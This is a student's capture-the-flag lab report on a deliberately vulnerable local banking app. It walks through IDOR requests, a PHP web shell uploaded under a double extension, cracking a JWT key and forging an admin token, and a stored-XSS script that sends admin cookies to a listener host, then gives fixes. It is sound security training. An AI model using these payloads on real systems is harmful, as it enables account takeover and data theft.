# Advanced Web Hacking for INT 406 Practical Activity
# _Authored By_ ![Author](https://img.shields.io/badge/Samuel-Mwangi-red)
## Student Details

|Field|Details|
|-----|-------|
|Student Name|Samuel Mwangi|
|Student ID|**2025/INT/12534**|
|Course Code| INT 406|
|Course Title|Advanced Ethical Hacking|
|Instructor|Mr Faisal Imran|
|Submitted On| 01/11/2026|

---
# Executive Summary
In this write up,a security assessment was carried out on the vulnerable **FAMJIS BANK** application is provided.The web application security test involved identifying, testing, and documenting any web application vulnerabilities in order to discover any hidden flag in an authorized environment. This security test was done to determine if the web application was vulnerable to common web application vulnerabilities which are:
- Insecure Direct Object Reference(IDOR)
- JSON Web Token Manipulation
- Stored XSS and 
- Unrestricted / Insecure File Upload which leads to **Remote command execution**. 

The assessment was carried out by using penetration testing utilities such as:
- Burp Suite (Where necessary)
- cURL used to make requests
- jwt_tool used to jwt manipulation
- other relevant utility(s).

The primary objective of the assessment was to uncover hidden web application vulnerabilities where the documentation is done on whether there was exploiitation of the vulnerability and determine whether they could be exploited to gain unauthorised access to sensitive data. Each vulnerability was investigated through controlled exploitation with a corresponding proof of concept with **flags** captured as evidence.
This report also gives recommendations on how to fix the vulnerabilities which is used to strengthen authentication and authorisation mechanisms.

In general,this assessment shows how weaknessses in web application security controls can expose sensitive information and compromise the confidentiality, integrity and the security of the web application.


## Introduction
The **FAMJIS** vulnerable web application was used to perform the security testing as part of INT 406 ICDFA Ethical hacking and Digital Forensics internship under the instructor **_Mr Faisal Imran_**. This activity provided a practical opportunity to apply web application penetration testing techniques in an authorised environment.

The assessment was focused in identifying and exploiting common web application vulnerabilities IDOR,JWT manipulation,XSS and Insecire file upload leading to Remote command execution which expose the user data to unauthorised access.

This lab activity clearly indicates how these vulnerabilities are expoloited together with a proof of concept captured as flags. The findings are documented together with its severity and the recommended actions to protect the web application from any attacks arising from these vulnerabilities.

## Lab Objectives

The primary objective of this lab activity was to develop field experience on web application penetration testing helping the student identify, document the findings and present them in a professional report. The specific objectives were:
- identify and exploit **IDOR Vulnerabilities** 
- Exploit weak JWT signing keys by cracking the key
- Test for stored XSS
- Set up a web server to collect stolen session keys
- Assess file upload Security
- Capture the flags as proof of exploitation
- Evaluate security implication of the vulnerabilities
- Recommend protective measures against weak security policies implementations
- Prepare a professional findings report

## Tools and Resources required
|Tool|Use| 
|---|---|
|Docker & Docker Compose| Hosts Containers to run the vulnerable application|
|FAMJIS Bank application|A vulnerable banking web application|
|Burp Suite| A web application toolkit for web penetration testing|
|Hashcat| Used to crack passwords based on hashes fed|
|curl|A commandline tool used to make HTTP requests|
|jwt_tool|A python tool used to tamper with a JWT|

## Rules of Engagement
The rules of engagement were set so that they would guide the penetration tester on how to engage with the target without affecting genuine users or even bringing the target offline. In this lab activity, the rules of engagements were:
- Attack your own **FAMJIS BANK** instance.
- Do not attack the student portal, the hosting or any other student instance or any system on the public internet.
- Do not run destructive Denial of Service attack.
- Automated scanning is allowed against the authorised environment only.
## Methodology
The steps followed to identify and exploit the vulnerabilities in this lab activities were clearly outlined in the laboratory guide. The solution and proof of exploitation follows a structured methodology where after the vulnerability has been identified, its only then exploitation and proof of exploitation can happen where the procedure to extract the flag documented.The steps followed to proof exploitation and capturing the flag were:
### 1. Installing **_FAMJIS Banking_** web application
This step involved acquiring the copy of the vulnerable application from [Github](https://github.com/Faisalauchan/famjis-bank-lab) where the installation and running is done under containers. Since the lab is a simulation and the flags are to be shown as proof of exploitation, the student and the password salts are set in the ```.env``` file created in the base of the project.
<img src="./Screenshots/environment_variables.png">
[Environment variables for the Banking application](./Screenshots/environment_variables.png) 

The command run is ```docker compose up -d``` which builds the project ready for access via the web browser.
<img src="./Screenshots/Building_Environment.png">
[A Screenshot building the application in the terminal](./Screenshots/Building_Environment.png)<br>
After the above steps were followed, the web application was now accessible via the browser ready for exploitation.

### 2. Web application Exploitation
In this phase, the web application is accessed via the browser on port ```8081``` after running the command ```sudo docker compose up``` to run the application as indicated in the screenshot below.
<img src="./Screenshots/running.png">
[A screenshot showing the containers running](./Screenshots/running.png). 

The application is then accessed via the browser and the credentials used to access the dashboard are ```you:password123``` as displayed in the login page below.
<img src="./Screenshots/login%20screen.png">
[A screenshot showing login credentials](./Screenshots/login%20screen.png)<br>
The credentials proof to be working and I was able to login as a demo customer **_Amara_** as shown in the screenshot below.
<img src="./Screenshots/dashboard.png">
[A screenshot showing Amara Dashboard](./Screenshots/dashboard.png). <br>
After the access to the dashboard has been confirmed, the hunting for the flags started based on what the demo user is actually allowed to do. These hunts were done in form of attacks which are described in details in <a href="#results-and-findings"> Results and Findings Section.</a>

## Results and Findings
This section explains in details how the vulnerabilities were identified and exploited together with the tools used to exploit them. Screenshots and commands used will be used as proof of exploitation to confirm that the exploitation happened. The attacks happened sequentially from **IDOR**,**Insecure File Uploads**, **JWT Manipulation** and lastly **Stored XSS** which allowed us to post the **admin** back to a listener running in a different port in the same host machine.

### 1. Insecure Direct Object Reference (IDOR)
This is an access control vulnerability where the application uses a user fed input to access records without properly verifying if the user has access rights to the resource.In this case, the developer API access provides access to the current users data. The request is made using ```curl``` in the format 
```bash 
curl -H "Authorization: Bearer <token>" http://localhost:8081/api/user/1023
```
where ```<token>``` is replaced by the user JWT which is available in the user's dashboard as indicated in the screenshot below.
<img src="./Screenshots/user_jwt.png">
[A screenshot showing users JWT token](./Screenshots/user_jwt.png).

The test for IDOR starts with checking if the endpoint works by sending the request below in the terminal.
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU" http://localhost:8081/api/user/1023
```
The response from the above result is shown in the screenshot below.
<img src="./Screenshots/response.png">
[A screenshot showing normal response from the server](./Screenshots/response.png)<br>
The request returns the current user data as shown in the screenshot above. When the user id was changed from ```1023``` to ```1024``` and sending the request below

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU" http://localhost:8081/api/user/1024
```
The server responds with the next user's data and it displays the flag ```ICDFA{idor_823d5c}``` as shown in the screenshot below.
<img src="./Screenshots/idor_flag.png">
[An image showing the web application is vulnerable to idor](./Screenshots/idor_flag.png).


### 2. Insecure File Uploads
This is a web application vulnerability where the files uploaded are not properly checked that a double extension file or a file ending with a null character( byte) is accepted and uploaded. In this case, the testing endpoint is ```http://localhost:8081/upload.php``` which accepts images only. Any other file which is not an image is rejected and the error message displayed is as shown below.
<img src="./Screenshots/restricted_upload.png">
[A screenshot showing showing restricted files rejected](./Screenshots/restricted_upload.png)<br>
The web appplication accepted a php shell which allowed us to execute commands by sending the command as a url parameter.The code in the shell is as shown in the screenshot below
![Shell](./Screenshots/shell.png).
The web application accepted the php shell in disguise of an image and it gave a success message as shown in the screenshot below.
<img src="./Screenshots/double_extention_file_uploaded.png">
[A screenshot showing a successfull upload of a double extension file](./Screenshots/double_extention_file_uploaded.png).<br>
To access the shell, a request was made to the URL ```http://localhost:8081/uploads/shell.php.png?cmd=ls``` with the command ```ls``` which displays the contents in the uploads directory as shown below.
<img src="./Screenshots/contents_uploads.png">
[A screenshot showing the contents in the uplloads directory](./Screenshots/contents_uploads.png)

After passing in Linux directory traversal commands, the path to the flag was determined and the flag was displayed using the URL ```http://localhost:8081/uploads/shell.php.png?cmd=cd%20../../private;cat%20upload_flag.txt``` which displays the flag ```ICDFA{upload_6edb74}``` as indicated in the image below.
<img src="./Screenshots/upload_flag.png">
[A screenshot showing insecure file upload flag](./Screenshots/upload_flag.png).

This simple shell indicates the use of a simple shell but real attackers use complicated shells. To demonstrate an example of a complicated shell is an ```Ani Shell``` which is uploaded to the server and can help you:
- inspecte files
- edit files
- rewrite files
- traverse directories among other functionalities.

The screenshot below shows the **Ani Shell** command interface.
<img src="./Screenshots/Ani_Shell.png">
[A screenshot showing Ani Shell interface](./Screenshots/Ani_Shell.png)

### JWT Manipulation
JSON Web Token manipulation is done to take advantage of weak authorization done by the web application.The implementation may have flaws either in verification or even use weak secret key when signing it. This allows attackers to manipulate the token or generate the exact same token which appears to be valid and is accepted by the web application. In this case, the token secret key is cracked using ```hashcat``` where e genuine key is then generated to make a request to the ```admin``` API endpoint.
The JWT was then identified using hashcat so that the cracking mode can be identified so that the cracking process will be seamless as indicated in the screenshot below.
<img src="./Screenshots/hash_identification.png">
[The screenshot identifying the hash mode to **_16500_**](./Screenshots/hash_identification.png).

After the mode has been identified, the secret signing key was cracked using the command 
```bash 
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU /home/pirate/Desktop/Tools/rockyou.txt
```
It is however noted that the cracking process requires a valid JWT key so that the correct secret key can be identified. The signing key was weak and therefore hashcat cracked it very fast as captured in the screenshot below.
<img src="./Screenshots/secret_key.png">
[A screenshot showing hashcat cracking JWT signing key](./Screenshots/secret_key.png)<br>
It is evident that the JWT secret signing key is ```secret123``` which will be used in the next step to craft an admin token to access ```/api/admin``` route.
The JWT in this lab activity was generated using a python code below.

```python 
import jwt
import getpass

# HS256 secret key
secret = "secret123"

# Match the original JWT payload
payload = {
    "uid": 1,
    "role": "admin",
    "name": "Amara Okonkwo",
    "isAdmin":True
}

# Generate JWT
token = jwt.encode(
    payload,
    secret,
    algorithm="HS256",
    headers={
        "typ": "JWT"
    }
)

print("\nGenerated JWT:")
print(token)
```
When the code is run, a new JWT token is printed to the console which can now allow us access the admin endpoint as the role has been set to admin.The JWT generated is ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJBbWFyYSBPa29ua3dvIiwiaXNBZG1pbiI6dHJ1ZX0.PRUdt_BD7dfmMASGSoEXTlL29YndN4ReIILStBAvUBQ```  and the claims encoded in the token is as shown below.
```json
{
  "uid": 1,
  "role": "admin",
  "name": "Amara Okonkwo",
  "isAdmin": true
}
```
It is however noted that the isAdmin key is not necessary and it does not affect the outcome as the only crucial item here is the ```role``` which is set to admin. 
_The user id was determined when testing for ```IDOR``` where different ids were fed in the url and the responses noted_
Now that the admin JWT has been generated, the request is made to the admin endpoint is 

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJBbWFyYSBPa29ua3dvIiwiaXNBZG1pbiI6dHJ1ZX0.PRUdt_BD7dfmMASGSoEXTlL29YndN4ReIILStBAvUBQ" http://localhost:8081/api/admin
```
The web application responds with the response 
```json
{
    "message": "Admin API access granted.",
    "flag": "ICDFA{jwt_fc02ff}"
}
```
giving out ```ICDFA{jwt_fc02ff}``` as the JWT manipulation cookie allowing us to escalate privilege to admin.

### Exploiting Stored XSS
Cross site scripting allows a web application to run javascript on the frontend. In this case, the web application does not sanitize the messages input by the user and allows them to be stored and executed by the user who will read the messages. In this scenario, the ```admin``` user will respond to the messages. For a session to be fixed, the ```/vault.php``` requires a valid admin session meaning that both the `token` and the `session` identifies must match an admin session. 
The exploitation is done in the following steps.

- create a local server to accept and log any HTTP request. This is done using php with the command ```php -S 0.0.0.0:8085```. This starts the server locally listening on port `8085` as indicated in the screenshot below.
<img src="./Screenshots/server.png"> 

[A screenshot showing a local PHP server waiting for connection](./Screenshots/server.png)
- Load the javascript to be stored in the database for stored xss. The code stored allowed the `admin bot` to post the cookies back to the server is
```javascript 
<script>
new Image().src=`http://192.168.0.108:8085?cookies=${document.cookie}`
</script>
```
where the cookies will be posted as parameters with the name `cookies`
- The cookies are then visible in the console as shown below.
<img src="./Screenshots/admin_cookies.png">
[A screenshot showing admin cookies](./Screenshots/admin_cookies.png)
- fix the tokens to the browser and access the vault.The tokens are edited using the `cookie editor` extension from the browser.After the editing has been done and the `session` and `token` cookies edited to fit the same as below, the browser is refreshed and the admin console is accessible where the last flag is visible. 
_The cookies are different from the one appearing in the screenshot above as the admin bot logs in again after some time so the cookie values change from time to time_. However, the tokens remain valid no matter how many times they change.
Navigating to `/vault.php` gives the response as shown in the screenshot below.
<img src="./Screenshots/xss_flag.png">
[Screenshot showing XSS cookies from the `/vault.php` route](./Screenshots/xss_flag.png).

The flag is displayed as `ICDFA{xss_4dd999}`.

## Severty Rating
Based on how easy/hard it was to exploit these vulnerabilities, the vulnerabilities are scored as shown in the table below.

|Vulnerability|Severity|Reason|
|---|---|---|
|IDOR|**High**|Allows authenticated users to access any record without proper checks just by changing the account identifier only.|
|JWT Manipulation|**Critical**|Allows an attacker to easily escalate the privilege to a higher level account. eg. the admin|
|Stored XSS|**High**|Leads to accounts compromise as indicated earlier|
|Unrestricted File Upload|**Critical**|Allows an attacker to achieve RCE which might lead to a complete infrastructure takeover|
|

## Business Implications of the Vulnerabilities
These are the consequences faced bythe victim after these vulnerabilities have been exploited. These implications range from loss of clients trust to a total business closure. In this case, the business implications of these vulnerabilites can be summarized in the table below.
|Vulnerability|Implication|
|---|---|
|IDOR|Leads to privacy violations as users will often access other users data leading to privacy violations which may lead to multi disciplinary law suits|
|JWT Manipulation| Exposes sensitive administrative interfaces leading to unauthorised malicious actions performed by attackers for their own gain. This leads to business loss in early stages|
|Stored XSS|This leads to access to privileged accounts leading to unauthorised administrative activities|
|Unrestricted File Uploads| Leads to RCE leading to customer data exposure, financial losses and even reputational damage|
|

## Recommendations
This writeup presents the ways in which the above identified and exploited vulnerabilities can be avoided and protect the web application. This writeup recommends the folowing:
- Verify any request where the records accessed are tied to a user fed input to determine whether the user has rights to access the resource.
- Enforce secure JWT verification policies incluidng strong signing keys so that they can not be easily cracked by a malicious user.
- Always escape user input before storing it to the database and also before displaying it to the user.
- Use strict file validation techniques or libraries that ensure the file checking techniques are not bypassed by double extensions or appending null bytes to file names as seen earlier.

## Conclusion
This lab activity successfully and comprehensively a penetration test on the **FAMJIS** bank application where four major web application vulnerabilites were exploited. This writeup also presented the findings, the business implications together with the vulnerability severity so that businesses can make informed decisions by clearly understanding the impacts of any vulnerability exploited by a malicious user. Addressing these vulnerabilities significantly increase the security posture of an institution therefore making them protect users data, prevent downtimes and reduce the risks of unauthorised access.